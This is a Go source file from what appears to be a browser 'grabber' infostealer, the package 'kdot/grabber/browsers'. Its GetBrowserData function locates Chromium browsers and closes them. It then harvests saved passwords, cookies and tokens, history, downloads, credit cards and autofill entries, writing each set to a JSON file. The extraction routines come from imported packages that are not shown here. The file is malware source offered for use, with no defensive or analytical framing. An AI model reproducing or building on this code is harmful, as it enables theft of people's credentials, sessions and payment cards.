package browsers

import (
	"os"

	"kdot/grabber/browsers/chromium/autofill"
	"kdot/grabber/browsers/chromium/cards"
	"kdot/grabber/browsers/chromium/cookies"
	"kdot/grabber/browsers/chromium/downloads"
	"kdot/grabber/browsers/chromium/finder"
	"kdot/grabber/browsers/chromium/history"
	"kdot/grabber/browsers/chromium/pass"
	"kdot/grabber/browsers/chromium/structs"
	"kdot/grabber/browsers/util"
)

func GetBrowserPasswords(browsers []structs.Browser) {
	//fmt.Println(pass.GetPasswords())
	os.WriteFile("passwords.json", []byte(pass.Get(browsers)), 0644)
}

func GetBrowserCookies(browsers []structs.Browser) {
	cookies.GetTokensAuto(browsers)
}

func GetBrowserHistory(browsers []structs.Browser) {
	//fmt.Println(history.GetHistory())
	os.WriteFile("history.json", []byte(history.Get(browsers)), 0644)
}

func GetBrowserAutofill(browsers []structs.Browser) {
	os.WriteFile("autofill.json", []byte(autofill.Get(browsers)), 0644)
}

func GetBrowserCards(browsers []structs.Browser) {
	os.WriteFile("cards.json", []byte(cards.Get(browsers)), 0644)
}

func GetBrowserDownloads(browsers []structs.Browser) {
	os.WriteFile("downloads.json", []byte(downloads.Get(browsers)), 0644)
}

func GetBrowserData() {
	totalBrowsers := finder.FindBrowsers()
	util.CloseBrowsers()
	GetBrowserPasswords(totalBrowsers)
	GetBrowserHistory(totalBrowsers)
	GetBrowserCookies(totalBrowsers)
	GetBrowserDownloads(totalBrowsers)
	GetBrowserCards(totalBrowsers)
	GetBrowserAutofill(totalBrowsers)
}
